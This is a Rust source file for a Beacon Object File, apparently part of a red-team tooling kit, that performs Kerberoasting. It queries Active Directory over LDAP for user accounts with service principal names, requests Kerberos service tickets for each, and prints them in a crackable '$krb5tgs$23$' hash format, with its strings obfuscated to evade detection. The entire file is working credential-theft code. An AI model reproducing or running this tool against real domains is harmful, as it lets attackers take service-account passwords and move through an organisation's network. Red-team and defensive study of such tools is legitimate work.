// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
#![no_std]
#![cfg_attr(not(test), no_main)]

use alloc::vec::Vec;

use rustbof::{println, eprintln};
use common::mitre::Technique;
use common::obf_cstr;
use bof_ldap::{connect_default_dc, bind_current_user, search_paged};
use bof_sspi::request_service_ticket;

const TECHNIQUES: &[Technique] = &[Technique {
    id: "T1558.003",
    name: "Kerberoasting",
    tactic: "Credential Access",
}];

const LDAP_PORT: u32 = 389;
const HEX: &[u8; 16] = b"0123456789abcdef";

fn to_hex(bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(bytes.len() * 2);
    for &b in bytes {
        out.push(HEX[(b >> 4) as usize]);
        out.push(HEX[(b & 0x0F) as usize]);
    }
    out
}

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    if let Err(e) = run() {
        eprintln!("[!] {}", e);
    }
}

fn run() -> Result<(), &'static str> {
    obf_cstr! {
        let host_cstr   = c"";
        let base_cstr   = c"";
        let filter_cstr = c"(&(servicePrincipalName=*)(!(objectClass=computer)))";
        let attr_spn    = c"servicePrincipalName";
        let attr_sam    = c"sAMAccountName";
    }

    let h = match connect_default_dc(host_cstr.as_ptr() as *const i8, LDAP_PORT) {
        Ok(h) => h,
        Err(_) => return Err("ldap connect failed"),
    };
    if bind_current_user(&h).is_err() {
        return Err("ldap bind failed");
    }

    let mut attrs: [*mut i8; 3] = [
        attr_spn.as_ptr() as *mut i8,
        attr_sam.as_ptr() as *mut i8,
        core::ptr::null_mut(),
    ];

    let mut requested: u32 = 0;

    let r = search_paged(
        &h,
        base_cstr.as_ptr() as *const i8,
        filter_cstr.as_ptr() as *const i8,
        &mut attrs,
        1000,
        |e| {
            let sams = e.values(attr_sam.as_ptr() as *const i8);
            let spns = e.values(attr_spn.as_ptr() as *const i8);
            if sams.is_empty() || spns.is_empty() {
                return;
            }
            for spn in &spns {
                let mut cstr_spn = spn.clone();
                cstr_spn.push(0);
                let blob = match request_service_ticket(cstr_spn.as_ptr() as *const i8) {
                    Ok(b) => b,
                    Err(_) => continue,
                };
                let spn_s = core::str::from_utf8(spn).unwrap_or("?");
                let sam_s = core::str::from_utf8(&sams[0]).unwrap_or("?");
                let hex = to_hex(&blob);
                let hex_s = core::str::from_utf8(&hex).unwrap_or("");
                println!("$krb5tgs$23$*{}$*{}*${}", sam_s, spn_s, hex_s);
                requested += 1;
            }
        },
    );
    if r.is_err() {
        return Err("ldap query failed");
    }
    println!("[+] {} tickets requested", requested);
    Ok(())
}
